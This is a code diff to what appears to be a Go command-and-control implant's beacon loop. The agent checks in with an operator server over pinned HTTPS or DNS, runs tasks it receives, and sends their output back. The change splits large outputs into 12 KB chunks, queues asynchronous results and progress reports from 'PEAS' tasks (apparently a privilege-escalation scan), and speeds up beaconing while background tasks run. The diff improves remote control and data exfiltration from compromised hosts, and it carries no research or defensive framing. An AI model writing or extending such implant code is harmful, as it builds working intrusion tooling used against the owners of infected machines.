@@ -20,22 +20,27 @@ var interactiveMode int32
 // browsing responsive after the operator opens the path browser.
 var pathBrowseFastUntil int64
 
+var backgroundTaskCount int32
+
 const (
 	fastBeaconInterval   = 100 * time.Millisecond
 	pathBrowseFastWindow = 2 * time.Minute
 	failureLogInterval   = time.Minute
+	resultChunkBytes     = 12 * 1024
+	asyncResultQueueSize = 4096
 )
 
 var (
 	beaconNonceFn     = protocol.RandomNonce
 	sendBeaconHTTPSFn = sendBeaconHTTPS
 	sendBeaconDNSFn   = sendBeaconDNS
+	asyncResults      = make(chan *protocol.TaskResult, asyncResultQueueSize)
 )
 
 // Run starts the beacon loop. It blocks until a kill task is received or the process exits.
 func Run(cfg *Config) {
 	client := newPinnedClient(cfg.CertFingerprint)
-	var lastResult *protocol.TaskResult
+	var pendingResults []*protocol.TaskResult
 	consecutiveFailures := 0
 	var lastFailureLog time.Time
 	skipSleep := false
@@ -55,12 +60,21 @@ func Run(cfg *Config) {
 		}
 		skipSleep = false
 
+		if len(pendingResults) == 0 {
+			if result := nextAsyncResult(); result != nil {
+				pendingResults = append(pendingResults, chunkTaskResult(result)...)
+			}
+		}
+
 		nonce, err := beaconNonceFn()
 		if err != nil {
 			continue
 		}
 
-		pendingResult := lastResult
+		var pendingResult *protocol.TaskResult
+		if len(pendingResults) > 0 {
+			pendingResult = pendingResults[0]
+		}
 		beacon := &protocol.Beacon{
 			AgentID:    cfg.AgentID,
 			Timestamp:  time.Now().Unix(),
@@ -101,7 +115,12 @@ func Run(cfg *Config) {
 
 		// Only clear the pending result after the server has acknowledged the beacon.
 		// This preserves the audit trail across transient transport failures.
-		lastResult = nil
+		if pendingResult != nil {
+			pendingResults = pendingResults[1:]
+			if len(pendingResults) > 0 {
+				skipSleep = true
+			}
+		}
 
 		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
 		if err != nil || task.Type == "noop" {
@@ -116,7 +135,7 @@ func Run(cfg *Config) {
 		}
 
 		result := executeTask(task)
-		lastResult = result
+		pendingResults = append(pendingResults, chunkTaskResult(result)...)
 
 		if task.Type == "kill" {
 			return
@@ -127,6 +146,62 @@ func Run(cfg *Config) {
 	}
 }
 
+func chunkTaskResult(result *protocol.TaskResult) []*protocol.TaskResult {
+	if result == nil || result.Error != "" || len(result.Output) <= resultChunkBytes {
+		return []*protocol.TaskResult{result}
+	}
+
+	total := (len(result.Output) + resultChunkBytes - 1) / resultChunkBytes
+	chunks := make([]*protocol.TaskResult, 0, total)
+	for i := 0; i < total; i++ {
+		start := i * resultChunkBytes
+		end := start + resultChunkBytes
+		if end > len(result.Output) {
+			end = len(result.Output)
+		}
+		chunks = append(chunks, &protocol.TaskResult{
+			TaskID:     result.TaskID,
+			Type:       result.Type,
+			Output:     result.Output[start:end],
+			ChunkIndex: i,
+			ChunkTotal: total,
+		})
+	}
+	return chunks
+}
+
+func nextAsyncResult() *protocol.TaskResult {
+	select {
+	case result := <-asyncResults:
+		return result
+	default:
+		return nil
+	}
+}
+
+func queueAsyncResult(result *protocol.TaskResult) {
+	if result == nil {
+		return
+	}
+	asyncResults <- result
+}
+
+func queueAsyncProgress(taskID, message string) {
+	if message == "" {
+		return
+	}
+	progressID := taskID + "-peas-" + time.Now().UTC().Format("150405.000000000")
+	select {
+	case asyncResults <- &protocol.TaskResult{
+		TaskID: progressID,
+		Type:   "peas_progress",
+		Output: message,
+	}:
+	default:
+		log.Printf("dropping PEAS progress for %s: async result queue full", taskID)
+	}
+}
+
 func hostname() string {
 	h, _ := os.Hostname()
 	return h
@@ -134,6 +209,9 @@ func hostname() string {
 
 func fastBeaconActive() bool {
 	if atomic.LoadInt32(&interactiveMode) == 1 {
+		return true
+	}
+	if atomic.LoadInt32(&backgroundTaskCount) > 0 {
 		return true
 	}
 	return pathBrowseFastActive()
